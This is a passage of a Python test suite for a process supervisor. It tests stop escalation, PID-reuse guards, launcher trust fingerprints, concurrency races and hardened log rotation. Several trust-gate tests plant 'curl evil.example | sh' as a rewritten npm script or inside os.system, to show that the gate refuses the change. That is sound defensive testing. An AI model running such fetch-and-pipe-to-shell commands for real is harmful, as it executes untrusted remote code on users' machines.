        with contextlib.suppress(OSError, psutil.Error):
            psutil.Process(respawned).kill()
    assert outcome.warning is None or "still" in outcome.warning


@pytest.mark.integration
@pytest.mark.parametrize("phase", [1, 2], ids=["terminate", "kill"])
def test_a_process_we_could_not_signal_is_named_in_the_outcome(
    supervisor: Supervisor, project: Path, monkeypatch, phase: int
) -> None:
    """`design.md`: "nothing is reported as success that was not verified."

    A `psutil.Error` from `terminate()` or `kill()` was logged at INFO and
    dropped, so a group member the manager is not allowed to signal left
    `StopOutcome` looking exactly like a clean stop (LWSM-1224).

    Injected into ONE phase at a time, which is the whole reason this is
    parametrised. A fake that refuses both signals is reported whichever
    collection survives, so deleting either one alone left the suite green —
    `testing.md § T9`'s redundant-guard trap, and `CLAUDE.md` records it:
    mutate the whole mechanism, not one line of it.

    `AccessDenied`, not `NoSuchProcess`: a member that exited between the
    enumeration and the signal is the ordinary case, and the sibling test
    below pins that it stays silent.
    """
    write_launcher(project, "echo up\nwhile true; do sleep 0.05; done")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(lambda: "up" in managed.log_path.read_text(encoding="utf-8")), (
        "the launcher never started"
    )

    class Unsignallable:
        """A group member the kernel will not let us touch."""

        pid = 4242424

        def terminate(self) -> None:
            raise psutil.AccessDenied(self.pid)

        def kill(self) -> None:
            raise psutil.AccessDenied(self.pid)

        def is_running(self) -> bool:
            return False

        def status(self) -> str:
            return "dead"

    real = supervisor._group_members
    calls: list[int] = []

    def with_an_unsignallable_member(m):
        calls.append(1)
        # Call 1 is the terminate phase, call 2 the kill phase, call 3 the
        # straggler sweep — which answers honestly either way, so this stays
        # a test about the SIGNAL rather than about stragglers.
        return [*real(m), Unsignallable()] if len(calls) == phase else real(m)

    monkeypatch.setattr(supervisor, "_group_members", with_an_unsignallable_member)

    outcome = supervisor.stop(project, grace=0.2)

    assert outcome.warning is not None, "a member we could not signal went unreported"
    assert "4242424" in outcome.warning, outcome.warning


def test_the_bound_port_warning_does_not_name_an_owner(
    tmp_path: Path, project: Path
) -> None:
    """It reports what was observed, not whose the port is.

    The message asserted the port was held by "something this manager did not
    start", and nothing here asks the kernel who owns the socket. Since
    LWSM-1204 the honest answer may be a straggler of our own, which the sweep
    reports a line earlier — so one outcome could contradict itself
    (LWSM-1225).

    `design.md` asks for the port to be reported as held by a process the user
    cannot inspect, rather than for an owner to be invented.
    """
    probe = FakeProbe({9999})
    sup = Supervisor(probe=probe, log_dir=tmp_path / "logs")
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        managed = sup.start(project, name="demo", argv=["./start.sh"], port=None)
        managed.port = 9999
        assert wait_until(lambda: not _alive(managed.pid))

        outcome = sup.stop(project)

        assert outcome.port_still_bound
        assert outcome.warning is not None
        assert "did not start" not in outcome.warning, (
            f"the warning claims an owner nothing checked: {outcome.warning}"
        )
        assert "9999" in outcome.warning, outcome.warning
    finally:
        sup.close()


@pytest.mark.integration
def test_a_straggler_the_kill_did_not_reach_is_reported(
    supervisor: Supervisor, project: Path, monkeypatch
) -> None:
    """A stop that could not finish the job must say so, not claim success.

    Driven through the `_group_members` seam rather than with a real process,
    because a straggler is by definition something SIGKILL did not remove, and
    SIGKILL cannot be blocked — the only honest way to reach the branch is to
    inject the answer. What is under test is the report, not the enumeration:
    the enumeration has its own test beside this one, with a real child.

    Two mutants found this unmeasured: deleting the report entirely, and
    emitting it when there is nothing to report, both left the suite green.
    """
    write_launcher(project, "echo up\nwhile true; do sleep 0.05; done")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(lambda: "up" in managed.log_path.read_text(encoding="utf-8")), (
        "the launcher never started"
    )

    real = supervisor._group_members
    calls: list[int] = []

    def enumerate_with_a_straggler(m):
        calls.append(1)
        members = real(m)
        # The LAST call is the one after the kill wait. Everything before it
        # answers honestly, so the terminate and kill phases are unchanged.
        return members if len(calls) < 3 else [managed.handle]

    monkeypatch.setattr(supervisor, "_group_members", enumerate_with_a_straggler)

    outcome = supervisor.stop(project, grace=0.2)

    assert outcome.warning is not None, "a survivor was found and not reported"
    assert "still running" in outcome.warning, outcome.warning


@pytest.mark.integration
def test_stop_escalates_to_kill_when_sigterm_is_ignored(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(
        project,
        """
        trap '' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    # Waited for, never assumed: `sh` installs the trap a few milliseconds after
    # exec, and a SIGTERM arriving first kills it outright — exit code -15, no
    # escalation, and a test that fails only under load. Seen on a full-suite
    # run 2026-08-14 while passing in isolation.
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    outcome = supervisor.stop(project, grace=0.5)

    assert outcome.killed, "SIGTERM was ignored and nothing escalated"
    assert not _alive(managed.pid)


@pytest.mark.integration
def test_the_managed_child_is_not_reaped_before_the_stop_sequence_ends(
    supervisor: Supervisor, project: Path
) -> None:
    """LWSM-1047's structural half.

    While the sequence runs, the child's PID must still be reserved — a reaped
    PID is one the kernel may reissue, and it is in use here as a process-group
    id. A zombie is unreaped, so `Popen.returncode` staying `None` throughout is
    the observable form of the rule.

    The launcher **exits on SIGTERM rather than ignoring it**, which is what
    makes this test able to fail at all. Against a child that ignores the
    signal, a premature `poll()` finds it still running and reads `None` anyway,
    so the assertion holds whether or not the rule does. Measured by mutation on
    2026-08-14: the first version of this test survived a reap injected straight
    into the wait loop.
    """
    write_launcher(
        project,
        """
        trap 'exit 7' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    seen: list[int | None] = []
    supervisor.stop(
        project, grace=2.0, _on_wait=lambda: seen.append(managed.popen.returncode)
    )

    assert len(seen) > 1, (
        "the wait loop turned at most once, so it never spanned the child's exit "
        "and the assertion below would hold vacuously"
    )
    assert all(code is None for code in seen)
    assert managed.popen.returncode is not None, "the child was never reaped at all"


@pytest.mark.integration
def test_a_port_still_bound_after_the_child_exits_warns_and_signals_nothing(
    tmp_path: Path, project: Path
) -> None:
    """ADR-0003: "the port is still bound" is a reason to warn, never to signal.

    The `or` this replaces fired precisely when our child was already gone and
    something *else* held the port — the everyday `running (wrong port)` case —
    and signalled a PID the kernel was free to have reissued.
    """
    probe = FakeProbe({9999})
    sup = Supervisor(probe=probe, log_dir=tmp_path / "logs")
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        managed = sup.start(project, name="demo", argv=["./start.sh"], port=None)
        managed.port = 9999
        assert wait_until(lambda: not _alive(managed.pid))

        outcome = sup.stop(project)

        assert outcome.port_still_bound
        assert outcome.warning is not None and "9999" in outcome.warning
        assert not outcome.terminated and not outcome.killed
    finally:
        sup.close()


@pytest.mark.integration
def test_stop_async_runs_off_the_calling_thread(
    supervisor: Supervisor, project: Path
) -> None:
    """A 5-second grace period on the UI thread would freeze the window."""
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    threads: list[int] = []
    future = supervisor.stop_async(
        project, _on_wait=lambda: threads.append(threading.get_ident())
    )
    outcome = future.result(timeout=30)

    assert outcome is not None
    assert threads and all(ident != threading.get_ident() for ident in threads)


def test_stopping_a_project_that_was_never_started_is_not_an_error(
    supervisor: Supervisor, project: Path
) -> None:
    outcome = supervisor.stop(project)
    assert outcome.exit_code is None
    assert not outcome.terminated and not outcome.killed


@pytest.mark.integration
def test_close_reaps_every_descriptor_and_leaves_the_servers_running(
    tmp_path: Path, project: Path
) -> None:
    """ADR-0003: children are left running on manager exit, by design.

    Servers outlive the window and ADR-0004 lets a later session re-adopt them.
    That is only safe because the output goes to a *file*: a child inheriting a
    pipe would die of SIGPIPE the moment it wrote after we exited.
    """
    sup = Supervisor(probe=FakeProbe(), log_dir=tmp_path / "logs")
    write_launcher(project, "sleep 30\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = sup.start(project, name="demo", argv=["./start.sh"], port=None)

    sup.close()

    assert _alive(managed.pid), "close() stopped a server it was meant to leave running"
    with pytest.raises(OSError):
        os.fstat(managed.log_fd)
    # Not part of the assertion — the fixture cleanup this test opts out of.
    _reap(managed.popen)


# --------------------------------------------------------------------------
# Small helpers used by the assertions above
# --------------------------------------------------------------------------


def _pgid(pid: int) -> int | None:
    try:
        return os.getpgid(pid)
    except OSError:
        return None


def _alive(pid: int) -> bool:
    try:
        return psutil.Process(pid).status() != psutil.STATUS_ZOMBIE
    except psutil.Error:
        return False


def _reap(popen: subprocess.Popen) -> None:
    try:
        os.killpg(popen.pid, 9)
    except OSError:
        pass
    try:
        popen.wait(timeout=5)
    except (subprocess.TimeoutExpired, ChildProcessError):
        pass


# --------------------------------------------------------------------------
# LWSM-1132 / LWSM-1140 — which file a launcher argv actually runs
# --------------------------------------------------------------------------


LAUNCHER_KINDS = ("shell", "python", "node", "npm")


def test_exited_reports_a_dead_child_without_reaping_it(
    supervisor: Supervisor, project: Path
) -> None:
    """The evidence the controller needs to unstick a `starting` overlay
    (LWSM-1134), and it must not be bought with a reap.

    `Popen.poll()` answers the same question and frees the PID that
    `start_new_session=True` made the process-group id — ADR-0003 forbids that
    until the stop sequence ends. A zombie is unreaped, so the PID stays
    reserved and `exited` still reads True.

    `running()` cannot answer it: the entry is removed in `_reap`, which only
    the stop sequence reaches, so a child that dies on its own stays in the map.
    """
    write_launcher(project, "exit 3\n")
    argv = ("./start.sh",)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    managed = supervisor.start(project, name="demo", argv=list(argv), port=None)

    deadline = time.monotonic() + 5.0
    while supervisor.exited(project) is False and time.monotonic() < deadline:
        time.sleep(0.02)

    assert supervisor.exited(project) is True
    assert managed.popen.returncode is None, "asking must not have reaped the child"
    assert project in supervisor.running(), (
        "a child that exits on its own is never removed from the map, which is "
        "why running() cannot stand in for this"
    )

    assert supervisor.stop(project).exit_code == 3


def test_a_live_child_has_not_exited_and_an_unknown_project_never_did(
    supervisor: Supervisor, project: Path
) -> None:
    """The negative half. Without it the fix could return True unconditionally
    and every `starting` overlay would clear on the first poll — which is the
    flicker ADR-0004 § Slowness is not failure exists to prevent.
    """
    write_launcher(project, "sleep 30\n")
    argv = ("./start.sh",)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    supervisor.start(project, name="demo", argv=list(argv), port=None)

    assert supervisor.exited(project) is False
    assert supervisor.exited(project / "never-started") is False


@pytest.fixture
def launcher_factory(project: Path, tmp_path: Path, monkeypatch):
    """Build a launcher of any of the four shapes `scanner.py` emits.

    The shapes are that module's, verbatim: `("./start.sh",)` at `:981`,
    `("npm", "run", <script>)` at `:1086`, and `(<interpreter>, <file>)` at
    `:1144` for `python3` and `node`.

    One fixture per member of the set, because every other `start()` test in
    this file used `("./start.sh",)` — so the one launcher kind that worked was
    the only one covered, and three that could not start at all survived 494
    green tests (LWSM-1132).

    The `npm` case uses a stand-in on `PATH` rather than the real one: the
    behaviour under test is this supervisor's refusal path, not npm's, and a
    real `npm run` would make the test slow and dependent on a node toolchain.
    """

    def build(kind: str) -> tuple[str, ...]:
        if kind == "shell":
            write_launcher(project, "exec sleep 30\n")
            return ("./start.sh",)
        if kind == "python":
            (project / "serve.py").write_text(
                "import time\n\ntime.sleep(30)\n", encoding="utf-8"
            )
            return ("python3", "serve.py")
        if kind == "node":
            (project / "serve.mjs").write_text(
                "setTimeout(() => {}, 30000);\n", encoding="utf-8"
            )
            return ("node", "serve.mjs")
        if kind == "npm":
            (project / "package.json").write_text(
                json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8"
            )
            fake_bin = tmp_path / "bin"
            fake_bin.mkdir(exist_ok=True)
            npm = fake_bin / "npm"
            npm.write_text("#!/bin/sh\nexec sleep 30\n", encoding="utf-8")
            npm.chmod(0o700)
            monkeypatch.setenv("PATH", f"{fake_bin}{os.pathsep}{os.environ['PATH']}")
            return ("npm", "run", "dev")
        raise AssertionError(f"unknown launcher kind {kind!r}")

    return build


@pytest.mark.parametrize("kind", LAUNCHER_KINDS)
def test_every_launcher_kind_the_scanner_emits_can_start(
    supervisor, project: Path, launcher_factory, kind: str
) -> None:
    """All four kinds, because three of them could not start at all.

    `_launcher_path` built `<project>/npm` for a PATH-resolved command:
    `.resolve()` is non-strict so the path came back unchanged, it *is* inside
    the project, and `validate_launcher`'s `os.stat` then raised ENOENT. The
    user saw `cannot read <project>/npm` — a message blaming their project for
    a supervisor bug (LWSM-1132).
    """
    argv = launcher_factory(kind)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))

    managed = supervisor.start(project, name="demo", argv=list(argv), port=None)

    assert psutil.pid_exists(managed.pid)


def test_a_path_resolved_command_names_no_file_inside_the_project(
    project: Path,
) -> None:
    """POSIX `execvp` searches `PATH` for an `argv[0]` containing no `/`, and
    never the working directory. `<project>/npm` is not a path that means
    anything, and constructing it is what refused three launcher kinds.
    """
    assert _launcher_path(project, ("npm", "run", "dev")) is None


@pytest.mark.parametrize(
    ("argv", "filename"),
    [(("python3", "serve.py"), "serve.py"), (("node", "serve.mjs"), "serve.mjs")],
)
def test_an_interpreter_argv_names_its_script_as_the_launcher(
    project: Path, argv: tuple[str, ...], filename: str
) -> None:
    """`execve` runs `/usr/bin/python3`, but the untrusted content is the script
    it is handed — so the script is what a confirmation must be bound to, and
    what `validate_launcher`'s refusals must apply to (LWSM-1140).
    """
    (project / filename).write_text("", encoding="utf-8")

    assert _launcher_path(project, argv) == (project / filename).resolve()


@pytest.mark.parametrize("argv", [("npm", "run", "dev"), ("npm", "run")])
def test_npm_never_names_a_launcher_file_whatever_its_argv_length(
    project: Path, argv: tuple[str, ...]
) -> None:
    """npm's arguments are subcommands, and `run` is not a filename.

    Found by diffing the classifier's verdicts old against new rather than by a
    test: a *two*-element `npm run` matches the interpreter shape on length
    alone, so a project holding a file called `run` would have had the trust
    gate vouching for a file that has nothing to do with what executes.
    """
    (project / "run").write_text("", encoding="utf-8")

    assert _launcher_path(project, argv) is None


def test_a_relative_launcher_still_resolves_inside_the_project(project: Path) -> None:
    """The one kind that already worked, pinned so the fix cannot regress it."""
    assert _launcher_path(project, ("./start.sh",)) == (project / "start.sh").resolve()


def test_an_interpreter_script_outside_the_project_is_still_the_launcher(
    project: Path,
) -> None:
    """Containment is the same rule for `argv[1]` as for `argv[0]` — and it is
    `validate_launcher`'s rule, not this function's.

    This test read `is not a launcher` until LWSM-1162, which is the defect
    written down as a contract: classifying an escaping path as "no launcher"
    is exactly what stopped `start()` from validating it. What must be true is
    that the escape is NAMED here and REFUSED there — see
    `test_start_refuses_a_launcher_symlinked_out_of_the_project`, which drives
    `start()` and is the test this one could never be.
    """
    escape = (project / ".." / "escape.py").resolve()
    assert _launcher_path(project, ("python3", "../escape.py")) == escape


def test_rewriting_an_npm_script_re_arms_the_trust_gate(project: Path) -> None:
    """ADR-0003 § Trust re-arms the gate "whenever the launcher command or its
    content hash changes". For `npm run dev` that content is the `scripts.dev`
    *string*, which npm hands to `/bin/sh` and which a compromised transitive
    dependency's `postinstall` can rewrite. The fingerprint covered no content
    at all for this kind — it hashed the argv and a `\\0nofile\\0` marker
    (LWSM-1140).
    """
    package = project / "package.json"
    argv = ("npm", "run", "dev")
    package.write_text(json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8")
    before = launcher_fingerprint(project, argv)

    package.write_text(
        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
    )

    assert launcher_fingerprint(project, argv) != before


def test_a_rewritten_npm_script_is_refused_after_confirmation(
    supervisor, project: Path
) -> None:
    """The end-to-end half: confirming `npm run dev` must not carry over to
    whatever `scripts.dev` is rewritten to say.
    """
    package = project / "package.json"
    argv = ["npm", "run", "dev"]
    package.write_text(json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8")
    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))

    package.write_text(
        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
    )

    with pytest.raises(LauncherUntrusted):
        supervisor.start(project, name="demo", argv=argv, port=None)


def test_rewriting_an_interpreter_script_re_arms_the_trust_gate(project: Path) -> None:
    """The same property for `python3 serve.py`, where the content is the script
    rather than a string inside a manifest.
    """
    script = project / "serve.py"
    argv = ("python3", "serve.py")
    script.write_text("print('hello')\n", encoding="utf-8")
    before = launcher_fingerprint(project, argv)

    script.write_text(
        "import os\n\nos.system('curl evil.example | sh')\n", encoding="utf-8"
    )

    assert launcher_fingerprint(project, argv) != before


# --------------------------------------------------------------------------
# LWSM-1137 / LWSM-1138 — start and stop under concurrency
# --------------------------------------------------------------------------


@pytest.mark.integration
def test_two_concurrent_starts_produce_one_child_and_one_refusal(
    supervisor: Supervisor, project: Path
) -> None:
    """`AlreadyRunning` was a check-then-act and did not hold.

    `start()` checked membership under the lock, then RELEASED it for the port
    pre-flight, the trust gate, the log open and the spawn. Two starts both
    passed the check, both spawned, and the second insert overwrote the first
    `ManagedProcess` — leaking its log descriptor and forgetting the PID that
    still held the port. That is verbatim the hazard `AlreadyRunning`'s own
    docstring names.

    The first spawn is held open inside the trust gate, which is where the
    window actually is; a test issuing two starts back to back would serialise
    on the GIL and pass against the broken code.

    Dies on reverting the reservation in `start()` to a bare membership test.
    """
    write_launcher(project, "while true; do sleep 0.05; done\n")
    fingerprint = launcher_fingerprint(project, ("./start.sh",))
    supervisor.trust.confirm(project, fingerprint)

    entered = threading.Event()
    proceed = threading.Event()
    real_is_confirmed = supervisor.trust.is_confirmed

    def slow_is_confirmed(project_arg: Path, fingerprint_arg: str) -> bool:
        # Only the first caller is held: the second must be refused before it
        # ever reaches this point, which is the property under test.
        if not entered.is_set():
            entered.set()
            proceed.wait(timeout=10)
        return real_is_confirmed(project_arg, fingerprint_arg)

    supervisor.trust.is_confirmed = slow_is_confirmed  # type: ignore[method-assign]

    outcomes: list[object] = []

    def start_it() -> None:
        try:
            outcomes.append(
                supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
            )
        except BaseException as exc:  # the outcome IS the assertion
            outcomes.append(exc)

    first = threading.Thread(target=start_it)
    first.start()
    assert entered.wait(timeout=10), "the first start never reached the trust gate"

    second = threading.Thread(target=start_it)
    second.start()
    second.join(timeout=10)
    proceed.set()
    first.join(timeout=10)

    refusals = [item for item in outcomes if isinstance(item, AlreadyRunning)]
    started = [item for item in outcomes if isinstance(item, ManagedProcess)]
    assert len(refusals) == 1, f"expected exactly one AlreadyRunning, got {outcomes!r}"
    assert len(started) == 1, f"expected exactly one child, got {outcomes!r}"
    assert list(supervisor.running()) == [project.resolve()]


@pytest.mark.integration
def test_a_refused_start_does_not_lock_the_project_out(
    supervisor: Supervisor, project: Path
) -> None:
    """The reservation must end when the start fails, not only when it succeeds.

    A `finally` that only ran on the happy path would turn one refused start —
    an unconfirmed launcher, a bound port — into a project that can never be
    started again for the life of the session, which is a worse bug than the
    race it was added to close.

    Dies on moving the `starting.discard` out of the `finally`.
    """
    write_launcher(project, "while true; do sleep 0.05; done\n")

    with pytest.raises(LauncherUntrusted):
        supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    assert managed.pid > 0
    supervisor.stop(project)


@pytest.mark.integration
def test_two_concurrent_stops_close_the_log_descriptor_once(
    supervisor: Supervisor, project: Path
) -> None:
    """The registry entry was popped only in `_reap`, at the very END of stop.

    So two overlapping stops both retrieved the same `ManagedProcess` and both
    reached `_close_quietly(managed.log_fd)`. The second `os.close` operates on
    an integer the kernel is free to have reissued — to another project's log,
    or to the rotation backup. The stop pool has `max_workers=4`, so the overlap
    is reachable, and `controller.stop_project`'s `running()` check is itself a
    check-then-act and does not close it.

    Asserted on the DESCRIPTOR, not on the outcome: two `StopOutcome`s that both
    look plausible is exactly what the broken version returned.

    Dies on moving the registry pop back into `_reap`.
    """
    write_launcher(project, "while true; do sleep 0.05; done\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    closed: list[int] = []
    real_close = os.close

    def counting_close(fd: int) -> None:
        closed.append(fd)
        real_close(fd)

    with mock.patch.object(supervisor_module.os, "close", counting_close):
        futures = [
            supervisor.stop_async(project, grace=0.5),
            supervisor.stop_async(project, grace=0.5),
        ]
        outcomes = [future.result(timeout=30) for future in futures]

    assert closed.count(managed.log_fd) == 1, (
        f"the log descriptor {managed.log_fd} was closed {closed.count(managed.log_fd)}"
        " times; the second close lands on whatever the kernel reissued it to"
    )
    # One of the two owns the sequence; the other finds nothing and says so.
    assert sum(1 for outcome in outcomes if outcome.terminated) == 1
    assert sum(1 for outcome in outcomes if not outcome.terminated) == 1
    assert supervisor.running() == {}


# --- LWSM-1018: the log cap is a setting ---------------------------------------


def test_a_lowered_log_cap_rotates_a_file_the_default_would_have_kept(
    supervisor, project
) -> None:
    """The cap actually enforced is the instance's, not the module constant.

    The size written here is far BELOW `MAX_LOG_BYTES` and above the lowered
    cap, which is the whole point: against a `rotate_if_needed` still reading
    the module constant this file is comfortably under the limit and nothing
    rotates. A test that lowered the cap and then wrote `MAX_LOG_BYTES + 1`
    bytes would pass either way and prove nothing.

    Dies on reverting `self.max_log_bytes` to `MAX_LOG_BYTES` in
    `rotate_if_needed`.
    """
    lowered = 4096
    assert lowered < MAX_LOG_BYTES, "the point of this test is a cap below the default"

    write_launcher(project, "sleep 30\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    supervisor.max_log_bytes = lowered
    os.pwrite(managed.log_fd, b"x" * (lowered + 1), 0)

    assert supervisor.rotate_if_needed(project) is True
    rotated = managed.log_path.with_name(managed.log_path.name + ".1")
    assert rotated.exists(), "the lowered cap was ignored"
    assert managed.log_path.stat().st_size <= lowered
    supervisor.stop(project)


# --- LWSM-1229: the rotation backup is opened like the log, not loosely -------


def _rotatable(supervisor, project):
    """A started project whose log is already over the cap."""
    write_launcher(project, "sleep 30\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    supervisor.max_log_bytes = 4096
    os.pwrite(managed.log_fd, b"x" * (supervisor.max_log_bytes + 1), 0)
    return managed


def test_a_fifo_planted_where_the_rotated_log_goes_refuses_instead_of_hanging(
    supervisor, project
) -> None:
    """`O_NOFOLLOW` refuses a symlink and says nothing about a FIFO.

    Opening one for writing blocks until a reader appears — forever, on the
    thread that asked, which here is the poll. No error, no log line, and
    every project's log cap stops being enforced. `O_NONBLOCK` turns that
    into an immediate ENXIO, which is why it is in the open rather than
    beside it.

    If this test ever hangs rather than fails, that IS the defect: the flag
    is gone.
    """
    managed = _rotatable(supervisor, project)
    backup = managed.log_path.with_name(managed.log_path.name + ROTATION_SUFFIX)
    os.mkfifo(backup, 0o600)

    try:
        with pytest.raises(OSError):
            supervisor.rotate_if_needed(project)
        assert managed.log_path.stat().st_size > supervisor.max_log_bytes, (
            "the source log must be left alone when the backup is refused"
        )
    finally:
        supervisor.stop(project, grace=0.5)


def test_a_hard_link_at_the_rotated_path_is_refused_before_it_is_emptied(
    supervisor, project
) -> None:
    """The check has to gate the destruction, or it is not worth having.

    `O_TRUNC` empties the target as PART of opening it, so with the flags in
    the open the refusal arrives after the damage: a file the user cares
    about, hard-linked here, is already blank. Emptying with `ftruncate`
    after `_require_private_regular_file` has passed is what makes the
    refusal mean anything.

    Dies on moving the truncation back into the open flags — the refusal
    still fires, and the bystander comes back empty.
    """
    managed = _rotatable(supervisor, project)
    backup = managed.log_path.with_name(managed.log_path.name + ROTATION_SUFFIX)
    bystander = project / "something-the-user-wanted"
    bystander.write_bytes(b"not ours to destroy")
    os.link(bystander, backup)

    try:
        with pytest.raises(OSError):
            supervisor.rotate_if_needed(project)
        assert bystander.read_bytes() == b"not ours to destroy", (
            "the hard-linked file was emptied before the refusal fired"
        )
    finally:
        supervisor.stop(project, grace=0.5)


# --- LWSM-1167: owns_pid — is this pid in our child's process group? ----------


def test_owns_pid_accepts_our_child_and_refuses_a_stranger(
    supervisor: Supervisor, project: Path
) -> None:
    """The question `RowView.managed` should have been asking all along.

    This test process stands in for the stranger: a real, live pid in a
    different process group. That is exactly the case the old
    `set(running())` test called managed, because it never asked who was
    listening -- only whether we held an entry.
    """
    write_launcher(project, "sleep 30 &\ntouch ready\nwait\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    await_ready(project)

    assert supervisor.owns_pid(project, managed.pid)
    assert not supervisor.owns_pid(project, os.getpid()), (
        "the test process is alive and in another group -- not ours"
    )
    assert not supervisor.owns_pid(Path("/srv/never-started"), managed.pid), (
        "a project we hold no child for owns nothing"
    )


def test_owns_pid_accepts_a_grandchild_in_the_group(
    supervisor: Supervisor, project: Path
) -> None:
    """The whole reason this is the GROUP and not the child's pid.

    A launcher that spawns the real server leaves the port held by a
    grandchild, and comparing against the child's own pid would report every
    wrapper-script project as not ours -- the shape LWSM-1009's acceptance
    names and LWSM-1132 shipped a bug behind. `start_new_session=True` is what
    makes the group answer available at all.
    """
    write_launcher(project, "sleep 30 &\ntouch ready\nwait\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    await_ready(project)

    grandchildren = psutil.Process(managed.pid).children(recursive=True)
    assert grandchildren, "precondition: the launcher must have spawned one"

    assert supervisor.owns_pid(project, grandchildren[0].pid), (
        "the grandchild holds the port in real launchers, and it is in the group"
    )


def test_owns_pid_refuses_everything_once_the_child_is_gone(
    supervisor: Supervisor, project: Path
) -> None:
    """The PID-reuse guard, which is why this cannot be a bare getpgid compare.

    Once our child is gone its pid is free to be reallocated as some unrelated
    process's group id. `_alive` on the handle captured at spawn is what tells
    them apart -- ADR-0004's "the recorded child PID **plus its create_time**".
    Asserted by killing the child and re-asking with the very pid that was ours
    a moment ago.
    """
    write_launcher(project, "sleep 30 &\ntouch ready\nwait\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    await_ready(project)
    assert supervisor.owns_pid(project, managed.pid), "precondition"

    supervisor.stop(project, grace=0.5)

    assert not supervisor.owns_pid(project, managed.pid)


def test_owns_pid_refuses_a_child_that_has_already_exited(
    supervisor: Supervisor, project: Path
) -> None:
    """The `_alive` PID-reuse guard, which the stop-path test cannot reach.

    `stop()` POPS the registry entry (LWSM-1138), so after a stop `owns_pid`
    answers False from its `managed is None` branch and never consults the
    guard at all. The mutation run proved it: deleting `_alive` left that test
    green, which read as "the guard is untested" and was exactly right.

    A launcher that exits on its own leaves the entry in place -- LWSM-1165
    keeps it while the group lives, and nothing reaps here because that is the
    controller's poll. The child is then an unreaped zombie whose pid is STILL
    RESERVED, so `getpgid` happily answers and returns the child's own pid as
    its group. Only `_alive` separates "our child holds this port" from "our
    child is dead and its pid is on borrowed time".
    """
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    proc = psutil.Process(managed.pid)
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline and proc.status() != psutil.STATUS_ZOMBIE:
        time.sleep(0.02)
    assert proc.status() == psutil.STATUS_ZOMBIE, "precondition: exited, unreaped"
    assert Path(project).resolve() in supervisor.running(), (
        "precondition: the entry must still be held, or this test measures the "
        "`managed is None` branch instead of the guard -- which is how the "
        "first version of it passed against code with no guard at all"
    )
    assert os.getpgid(managed.pid) == managed.pid, (
        "precondition: the zombie's pid is still reserved and still its own pgid"
    )

    assert not supervisor.owns_pid(project, managed.pid)


# --- LWSM-1169: rotation works through a descriptor nothing else can close ----


def test_rotation_does_not_truncate_a_file_a_concurrent_stop_freed_the_fd_for(
    supervisor: Supervisor, project: Path, tmp_path: Path, monkeypatch
) -> None:
    """A stop landing mid-rotation must not turn the truncate onto another file.

    `rotate_if_needed` reads the registry under the lock and then does its
    `fstat`, `pread` and `ftruncate` with the lock released -- on the poll
    thread, once a tick -- while `stop()` runs `_reap` on a worker and closes
    that same descriptor. Once the number is free the kernel reissues it to the
    next `open`, and the `ftruncate` blanks whatever now holds it: another
    project's log, the `.1` backup, or an atomic-write temp file.

    The interleaving is forced, not raced. A real `stop()` runs from inside the
    first `pread` and the bystander is opened straight after, so it provably
    takes the freed number -- which the assertion checks, because a test that
    failed to reissue the descriptor would pass while proving nothing. Two
    back-to-back calls would simply run in order.

    Dies on rotating through `managed.log_fd` instead of a duplicate.
    """
    sentinel = b"another project's log\n" * 64
    bystander = tmp_path / "bystander.log"
